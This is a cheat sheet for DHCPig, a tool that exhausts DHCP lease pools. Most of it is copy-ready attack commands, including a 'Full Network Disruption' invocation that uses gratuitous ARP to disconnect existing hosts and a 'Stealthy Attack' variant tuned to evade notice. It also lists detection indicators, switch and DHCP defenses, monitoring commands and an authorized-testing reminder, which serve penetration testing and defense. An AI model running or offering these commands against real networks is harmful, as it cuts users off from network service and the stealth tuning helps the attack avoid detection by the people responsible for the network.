# DHCPig Quick Reference

## Installation

```bash
sudo apt install dhcpig
# OR
pip3 install scapy
git clone https://github.com/kamorin/DHCPig.git
```

## Basic Commands

| Command | Description |
|---------|-------------|
| `sudo pig.py eth0` | Basic DHCP exhaustion |
| `sudo pig.py -v 99 eth0` | Verbose output |
| `sudo pig.py -t 4 eth0` | Multi-threaded |
| `sudo pig.py -g -r eth0` | Full attack (ARP + release) |
| `sudo pig.py -6 eth0` | DHCPv6 attack |
| `sudo pig.py -a eth0` | Monitor ARP only |

## Options Reference

```
-v NUM      # Verbosity (0-99, default 10)
-6          # Use DHCPv6
-t NUM      # Number of threads
-s "MAC,.." # Custom MAC addresses
-f          # Fuzzing mode
-a          # Show ARP activity
-i          # Show ICMP requests
-o          # Show lease info
-l          # Show DHCP replies
-g          # Gratuitous ARP attack
-r          # Release neighbor IPs
-n          # ARP neighbor scan
-x NUM      # Thread spawn timer
-y NUM      # DOS timeout
-z NUM      # DHCP request timeout
```

## Quick Scenarios

### Basic Exhaustion
```bash
sudo pig.py eth0
```

### Full Network Disruption
```bash
sudo pig.py -g -r -n -t 4 eth0
```

### Stealthy Attack
```bash
sudo pig.py -x 5.0 -y 30 -z 10 -v 1 eth0
```

### Monitor Only
```bash
sudo pig.py -a -i -o eth0
```

## Attack Phases

1. **DISCOVER** - Elicit server response
2. **REQUEST** - Request IP lease
3. **ACK** - Obtain IP address
4. **Repeat** - Consume entire scope
5. **ARP** - Disconnect existing hosts

## Detection Indicators

- Multiple DISCOVER from different MACs
- Rapid lease acquisition
- ARP anomalies
- Scope utilization spike

## Defense Quick Fixes

```bash
# DHCP rate limiting (ISC dhcpd)
one-lease-per-client on;

# Switch port security
switchport port-security maximum 2

# DHCP snooping
ip dhcp snooping
```

## Common DHCP Ports

| Port | Protocol | Service |
|------|----------|---------|
| 67 | UDP | DHCP Server |
| 68 | UDP | DHCP Client |
| 546 | UDP | DHCPv6 Client |
| 547 | UDP | DHCPv6 Server |

## Monitor Commands

```bash
# Watch DHCP leases
tail -f /var/lib/dhcp/dhcpd.leases

# Count active leases
cat /var/lib/dhcp/dhcpd.leases | grep "lease" | wc -l

# Detect spoofed MACs
tcpdump -i eth0 -e | awk '{print $12}' | sort | uniq -c | sort -rn
```

## System Requirements

- Root/sudo privileges
- Python 3 + Scapy
- Access to target network segment
- Promiscuous mode capable NIC

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No DHCP server | Verify with `nmap -sU -p 67` |
| Permission denied | Run with `sudo` |
| Slow performance | Increase `-t` threads |
| Interface error | Check `ifconfig eth0` |

## Legal Reminder

**Authorized testing only!** DHCPig disrupts network services. Always obtain written permission.
